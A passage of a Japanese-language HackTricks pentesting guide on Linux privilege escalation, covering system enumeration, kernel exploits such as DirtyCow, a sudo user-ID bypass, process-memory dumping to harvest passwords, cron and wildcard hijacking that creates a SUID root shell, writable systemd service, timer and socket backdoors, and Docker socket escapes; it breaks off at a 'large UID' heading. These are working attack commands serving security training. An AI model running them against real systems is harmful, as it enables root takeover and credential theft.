# Linux権限昇格

{% hint style="success" %}
AWSハッキングの学習と練習:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングの学習と練習: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、ハッキングテクニックを共有してください。

</details>
{% endhint %}

## システム情報

### OS情報

OSの情報を収集することから始めましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### パス

もし`PATH`変数の中の**任意のフォルダに書き込み権限がある**場合、いくつかのライブラリやバイナリを乗っ取ることができるかもしれません：
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワード、またはAPIキーがありますか？
```bash
(env || set) 2>/dev/null
```
### カーネル exploits

カーネルバージョンを確認し、特権を昇格させるために使用できる exploit があるかどうかを確認します
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良い脆弱なカーネルのリストとすでに**コンパイルされたエクスプロイト**がこちらにあります: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) および [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
いくつかの**コンパイルされたエクスプロイト**を見つけることができる他のサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのウェブサイトからすべての脆弱なカーネルバージョンを抽出するには:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
次のようなカーネルエクスプロイトを検索するのに役立つツールは次のとおりです：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（被害者で実行し、カーネル2.xのエクスプロイトのみをチェック）

常に**Googleでカーネルバージョンを検索**してください。おそらくあなたのカーネルバージョンはあるカーネルエクスプロイトに記載されており、その後そのエクスプロイトが有効であることを確認できます。

### CVE-2016-5195（DirtyCow）

Linux特権昇格 - Linuxカーネル <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo バージョン

脆弱なsudoバージョンに基づいています:
```bash
searchsploit sudo
```
以下のgrepを使用して、sudoのバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

@sickrov から
```
sudo -u#-1 /bin/bash
```
### Dmesg署名検証に失敗しました

この脆弱性がどのように悪用されるかの**例**については、**HTBのsmasher2ボックス**を参照してください
```bash
dmesg 2>/dev/null | grep "signature"
```
### より多くのシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御策の列挙

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshieldは、Linuxカーネルのセキュリティ機能の1つであり、スタックやヒープのオーバーフローからシステムを保護します。
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SElinux（Security-Enhanced Linux）は、Linuxカーネルに組み込まれたセキュリティ拡張機能です。SElinuxは、アクセス制御と強化された権限管理を提供し、特権昇格攻撃からシステムを保護します。
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

ASLR（Address Space Layout Randomization）は、攻撃者が悪用するのを困難にするために、プロセスのメモリ配置をランダム化するセキュリティ機能です。
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Dockerコンテナ内にいる場合、それから脱出を試みることができます:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## ドライブ

**マウントされているものとアンマウントされているもの**をチェックし、どこにどのようにマウントされているかを確認します。何かがアンマウントされている場合は、それをマウントしてプライベート情報をチェックすることができます。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**インストールされているコンパイラ**を確認してください。これは、カーネルエクスプロイトを使用する必要がある場合に役立ちます。そのエクスプロイトをコンパイルすることが推奨されているため、それを使用するマシン（または類似のマシン）でコンパイルする必要があります。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアのインストール

**インストールされたパッケージやサービスのバージョン**を確認します。たとえば古いNagiosバージョンなど、特権昇格に悪用される可能性があるものがあるかもしれません...\
より疑わしいインストールされたソフトウェアのバージョンを手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
もしマシンへのSSHアクセス権がある場合は、**openVAS**を使用して、マシン内にインストールされている古いバージョンや脆弱なソフトウェアをチェックすることもできます。

{% hint style="info" %}
_これらのコマンドはほとんど役に立たない情報を表示する可能性があるため、既知の脆弱性に対してインストールされたソフトウェアのバージョンが脆弱かどうかをチェックするOpenVASなどのアプリケーションを推奨します_
{% endhint %}

## プロセス

**実行されているプロセス**を確認し、**それが持つ権限よりも多い権限を持つプロセス**がないかをチェックしてください（たとえば、rootユーザーによって実行されているtomcatなど）。
```bash
ps aux
ps -ef
top -n 1
```
常に実行中の[**electron/cef/chromium debuggers**](electron-cef-chromium-debugger-abuse.md)を確認してください。特権を昇格するために悪用できる可能性があります。**Linpeas**は、プロセスのコマンドライン内に`--inspect`パラメータがあるかどうかをチェックしてこれらを検出します。\
また、**プロセスのバイナリに対する特権を確認**してください。他のユーザーのものを上書きできるかもしれません。

### プロセス監視

[**pspy**](https://github.com/DominicBreuker/pspy)などのツールを使用してプロセスを監視できます。これは、脆弱なプロセスが頻繁に実行されているか、一連の要件が満たされたときに特定するのに非常に役立ちます。

### プロセスメモリ

サーバーの一部のサービスは、**メモリ内に平文で資格情報を保存**することがあります。\
通常、他のユーザーに属するプロセスのメモリを読むには**root権限**が必要です。したがって、これは通常、既にrootでありさらに資格情報を発見したい場合により有用です。\
ただし、**通常のユーザーとして、所有するプロセスのメモリを読むことができる**ことに注意してください。

{% hint style="warning" %}
現在、ほとんどのマシンは**デフォルトでptraceを許可していない**ことに注意してください。つまり、特権のないユーザーに属する他のプロセスをダンプすることはできません。

ファイル _**/proc/sys/kernel/yama/ptrace\_scope**_ は、ptraceのアクセス可能性を制御します:

* **kernel.yama.ptrace\_scope = 0**: 同じuidを持つすべてのプロセスをデバッグできます。これは、ptracingが機能する古典的な方法です。
* **kernel.yama.ptrace\_scope = 1**: 親プロセスのみをデバッグできます。
* **kernel.yama.ptrace\_scope = 2**: 管理者のみがptraceを使用できます。CAP\_SYS\_PTRACE機能が必要です。
* **kernel.yama.ptrace\_scope = 3**: ptraceでプロセスをトレースできません。一度設定すると、再度ptracingを有効にするには再起動が必要です。
{% endhint %}

#### GDB

FTPサービスのメモリにアクセスできる場合（例えば）、Heapを取得してその資格情報を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDBスクリプト

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps と /proc/$pid/mem

特定のプロセスIDについて、**mapsはそのプロセスの仮想アドレス空間内でメモリがどのようにマップされているか**を示し、**各マップされた領域の権限**も示します。**mem**疑似ファイルは**プロセスのメモリ自体を公開**します。**maps**ファイルからは、**どのメモリ領域が読み取り可能か**とそのオフセットがわかります。この情報を使用して、**memファイルにシークし、すべての読み取り可能な領域をファイルにダンプ**します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`はシステムの**物理**メモリにアクセスを提供し、仮想メモリではありません。カーネルの仮想アドレス空間には`/dev/kmem`を使用できます。\
通常、`/dev/mem`は**root**と**kmem**グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for Linux

ProcDumpは、Windows向けSysinternalsツールスイートのクラシックなProcDumpツールのLinuxにおける再構想です。[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) から入手できます。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスメモリをダンプするためには、次のツールを使用できます:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_rootの要件を手動で削除して、所有しているプロセスをダンプできます
* [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) からのスクリプト A.5 (rootが必要です)

### プロセスメモリからの資格情報

#### 手動の例

認証プロセスが実行されていることがわかった場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
次のセクションを参照してプロセスのメモリをダンプする方法を見つけ、メモリ内の資格情報を検索できます：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

ツール[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)は、メモリから**平文の資格情報を盗み出し**、一部の**よく知られたファイル**からも取得します。正しく動作するには、root権限が必要です。

| 機能                                             | プロセス名           |
| ------------------------------------------------- | -------------------- |
| GDMパスワード（Kali Desktop、Debian Desktop）     | gdm-password         |
| Gnome Keyring（Ubuntu Desktop、ArchLinux Desktop） | gnome-keyring-daemon |
| LightDM（Ubuntu Desktop）                          | lightdm              |
| VSFTPd（アクティブFTP接続）                        | vsftpd               |
| Apache2（アクティブHTTPベーシック認証セッション） | apache2              |
| OpenSSH（アクティブSSHセッション - Sudo使用）      | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 予定された/Cron ジョブ

スケジュールされたジョブに脆弱性がないか確認してください。おそらく、root によって実行されるスクリプトを悪用できるかもしれません（ワイルドカードの脆弱性？root が使用するファイルを変更できますか？シンボリックリンクを使用できますか？root が使用するディレクトリに特定のファイルを作成できますか？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron パス

例えば、_**/etc/crontab**_ 内には以下のような PATH が記述されています: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー "user" が /home/user に対して書き込み権限を持っていることに注意_)

この crontab 内で、root ユーザーがパスを設定せずにコマンドやスクリプトを実行しようとした場合。例えば: _\* \* \* \* root overwrite.sh_\
その後、次のようにして root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### スクリプトをワイルドカードで使用するCron（ワイルドカードインジェクション）

ルートによって実行されるスクリプトにコマンド内に "**\***" がある場合、これを悪用して予期しないことを行うことができます（例：特権昇格）。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードがパスの前にある場合** _**/some/path/\***_ **のように、脆弱性はありません（** _**./\***_ **も同様です）。**

ワイルドカードの悪用トリックの詳細は、次のページを参照してください：

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Cronスクリプトの上書きとシンボリックリンク

**rootユーザーによって実行されるcronスクリプトを変更できる**場合、非常に簡単にシェルを取得できます。
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
もしrootで実行されるスクリプトが**完全アクセス権限を持つディレクトリ**を使用している場合、そのフォルダを削除して**別のスクリプトが制御可能なシンボリックリンクフォルダを作成**すると便利かもしれません
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁な cron ジョブ

プロセスを監視して、1分、2分、または5分ごとに実行されているプロセスを検索できます。これを利用して特権を昇格させることができるかもしれません。

たとえば、**1分間毎に0.1秒ごとに監視**し、**実行回数が少ないコマンド順にソート**して、最も実行されたコマンドを削除するには、次のようにします：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**pspy**を使用することもできます（これにより、開始されるすべてのプロセスが監視およびリスト化されます）。

### 不可視のcronジョブ

コメントの後にキャリッジリターンを入れることで（改行文字なしで）、cronジョブを作成することが可能です。例（キャリッジリターン文字に注意してください）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

`.service` ファイルを書き込むことができるかどうかを確認してください。もし書き込める場合、サービスが **開始**、**再起動**、または **停止**されるときに、**バックドアを実行**するように変更できます（おそらくマシンが再起動されるまで待つ必要があるかもしれません）。\
例えば、バックドアを次のように.serviceファイル内に作成します: **`ExecStart=/tmp/script.sh`**

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリに **書き込み権限** がある場合、それらをバックドアに変更できます。そのため、サービスが再実行されるときにバックドアが実行されます。

### systemd PATH - 相対パス

**systemd** が使用する PATH を次で確認できます:
```bash
systemctl show-environment
```
もし、パスの中のどこかに**書き込み**権限があることがわかった場合、**特権昇格**ができるかもしれません。次のような**サービス構成**ファイルで使用されている**相対パス**を検索する必要があります：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
その後、**実行可能**ファイルを作成し、**systemd PATHフォルダ内の相対パスバイナリと同じ名前**で書き込む。サービスが脆弱なアクション（**Start**、**Stop**、**Reload**）を実行するよう要求されたとき、あなたの**バックドアが実行される**（通常、権限のないユーザーはサービスを開始/停止できませんが、`sudo -l`を使用できるかどうかを確認してください）。

**`man systemd.service`**でサービスについて詳しく学ぶ。

## **タイマー**

**タイマー**は、名前が`**.timer**`で終わるsystemdユニットファイルで、`**.service**`ファイルやイベントを制御します。**タイマー**は、カレンダー時間イベントとモノトニック時間イベントの組み込みサポートを持つため、cronの代替として使用でき、非同期で実行できます。

すべてのタイマーを列挙するには、以下を使用できます：
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できる場合、systemd.unit（.serviceや.targetなど）の存在するものを実行させることができます。
```bash
Unit=backdoor.service
```
ドキュメントでは、ユニットが何であるかを読むことができます：

> このタイマーが経過したときにアクティブ化するユニット。引数はユニット名であり、その接尾辞は「.timer」ではありません。指定されていない場合、この値は、タイマーユニットと同じ名前のサービスにデフォルトで設定されます（上記を参照）。アクティブ化されるユニット名とタイマーユニットのユニット名が、接尾辞を除いて同一であることが推奨されています。

したがって、この権限を悪用するには、次のことが必要です：

- **書き込み可能なバイナリを実行している**systemdユニット（たとえば`.service`）を見つける
- **相対パスを実行している**systemdユニットを見つけ、**systemd PATH**上で**書き込み権限**を持っている（その実行可能ファイルをなりすますため）

**`man systemd.timer`** でタイマーについて詳しく学ぶ。

### **タイマーの有効化**

タイマーを有効にするには、ルート権限が必要で、次のコマンドを実行します：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
**タイマー**は、`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`にシンボリックリンクを作成することで**アクティブ化**されます。

## ソケット

Unixドメインソケット（UDS）は、クライアントサーバーモデル内で同じマシンまたは異なるマシンでの**プロセス間通信**を可能にします。これらは標準のUnix記述子ファイルを使用してコンピュータ間通信を行い、`.socket`ファイルを介して設定されます。

ソケットは`.socket`ファイルを使用して構成できます。

**`man systemd.socket`**でソケットについて詳しく学ぶことができます。このファイル内では、いくつかの興味深いパラメータを構成できます:

* `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`: これらのオプションは異なりますが、要約された情報は、ソケットがどこでリッスンするかを示します（AF_UNIXソケットファイルのパス、リッスンするIPv4/6および/またはポート番号など）。
* `Accept`: ブール値の引数を取ります。**true**の場合、**着信接続ごとにサービスインスタンスが生成**され、接続ソケットのみが渡されます。**false**の場合、すべてのリッスンソケット自体が**開始されたサービスユニットに渡され**、すべての接続に対して1つのサービスユニットが生成されます。この値は、データグラムソケットおよびFIFOの場合には無視され、1つのサービスユニットがすべての着信トラフィックを無条件に処理します。**デフォルトはfalse**です。パフォーマンス上の理由から、新しいデーモンは`Accept=no`に適した方法でのみ記述することが推奨されます。
* `ExecStartPre`、`ExecStartPost`: 1つ以上のコマンドラインを取り、それらはリッスン**ソケット**/FIFOが**作成**およびバインドされる**前**または**後**に**実行**されます。コマンドラインの最初のトークンは絶対ファイル名でなければならず、その後にプロセスの引数が続きます。
* `ExecStopPre`、`ExecStopPost`: リッスン**ソケット**/FIFOが**閉じられ**、削除される**前**または**後**に**実行**される追加の**コマンド**。
* `Service`: **着信トラフィック**で**アクティブ化するサービス**ユニット名を指定します。この設定は、Accept=noのソケットにのみ許可されています。デフォルトでは、ソケットと同じ名前のサービス（接尾辞が置換されたもの）がデフォルトです。ほとんどの場合、このオプションを使用する必要はないはずです。

### 書き込み可能な .socket ファイル

**書き込み可能な**`.socket`ファイルを見つけた場合、`[Socket]`セクションの冒頭に次のようなものを追加できます: `ExecStartPre=/home/kali/sys/backdoor`、そしてバックドアはソケットが作成される前に実行されます。したがって、**おそらくマシンが再起動されるまで待つ必要があるでしょう。**\
_そのソケットファイルの構成を使用している必要があることに注意してください。そうでない場合、バックドアは実行されません_

### 書き込み可能なソケット

**書き込み可能なソケット**を特定した場合（_ここではUnixソケットについて話しており、設定の`.socket`ファイルについてではありません_）、そのソケットと通信し、脆弱性を悪用する可能性があります。

### Unixソケットの列挙
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**悪用例:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP ソケット

HTTP リクエストを待ち受ける **ソケット** がいくつか存在する可能性があることに注意してください（_私は .socket ファイルではなく、UNIX ソケットとして機能するファイルについて話しています_）。次のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
### Writable Docker Socket

Dockerソケットは、通常`/var/run/docker.sock`にあり、セキュリティを確保する必要がある重要なファイルです。デフォルトでは、`root`ユーザーと`docker`グループのメンバーが書き込み権限を持っています。このソケットへの書き込みアクセスを持っていると特権昇格が可能になります。これがどのように行われるか、およびDocker CLIが利用できない場合の代替方法について説明します。

#### **Docker CLIを使用した特権昇格**

Dockerソケットへの書き込みアクセス権がある場合、次のコマンドを使用して特権を昇格させることができます。
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
### **Docker APIを直接使用する**

Docker CLIが利用できない場合、Docker APIと`curl`コマンドを使用してDockerソケットを操作することができます。

1.  **Dockerイメージのリスト:** 利用可能なイメージのリストを取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **コンテナの作成:** ホストシステムのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

新しく作成したコンテナを起動します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
3.  **コンテナにアタッチ:** `socat`を使用してコンテナに接続し、それ内でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat`接続を設定した後、ホストのファイルシステムへのルートレベルアクセスを持つコンテナ内で直接コマンドを実行できます。

### その他

**`docker`グループに所属しているためにDockerソケットに書き込み権限がある場合**、[**特権を昇格させるためのさらなる方法**があります](interesting-groups-linux-pe/#docker-group)。[**Docker APIがポートでリスニングされている場合、それを妨害することもできます**](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

**Dockerから脱出したり特権を昇格させるために悪用する方法**については、以下をチェックしてください:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) 特権昇格

**`ctr`**コマンドを使用できることがわかった場合、**特権を昇格させるために悪用できる可能性があります**ので、以下のページを読んでください:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** 特権昇格

**`runc`**コマンドを使用できることがわかった場合、**特権を昇格させるために悪用できる可能性があります**ので、以下のページを読んでください:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Busは、アプリケーションが効率的に相互作用しデータを共有するための洗練された**プロセス間通信（IPC）システム**であり、現代のLinuxシステムを念頭に設計されています。基本的なIPCをサポートし、プロセス間のデータ交換を促進するUNIXドメインソケットの拡張を思い起こさせます。さらに、イベントやシグナルのブロードキャストを支援し、システムコンポーネント間のシームレスな統合を促進します。たとえば、Bluetoothデーモンからの着信コールに関するシグナルは、音楽プレーヤーにミュートするよう促し、ユーザーエクスペリエンスを向上させます。さらに、D-Busはリモートオブジェクトシステムをサポートし、アプリケーション間のサービスリクエストやメソッド呼び出しを簡素化し、従来は複雑だったプロセスを合理化します。

D-Busは**許可/拒否モデル**で動作し、一致するポリシールールの累積効果に基づいてメッセージの権限（メソッド呼び出し、シグナルの発行など）を管理します。これらのポリシーはバスとのやり取りを指定し、これらの権限の悪用を通じて特権昇格が可能になる可能性があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf`にあるこのようなポリシーの例では、ルートユーザーが`fi.w1.wpa_supplicant1`にメッセージを所有し、送信し、受信する権限が与えられています。

特定のユーザーやグループが指定されていないポリシーは普遍的に適用され、"default"コンテキストポリシーは他の特定のポリシーでカバーされていないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここでD-Bus通信の列挙と悪用方法を学びます:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **ネットワーク**

ネットワークを列挙し、マシンの位置を特定することは常に興味深いです。

### 一般的な列挙
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### オープンポート

アクセスする前に対話できなかったマシンで実行されているネットワークサービスを常にチェックしてください：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### スニッフィング

トラフィックをスニッフィングできるかどうかを確認します。できる場合、いくつかの資格情報を取得できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

**自分**が誰であり、どの**権限**を持っているか、システムにはどの**ユーザー**がいるか、どれが**ログイン**できるか、どれが**root 権限**を持っているかを確認します：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大きなUID

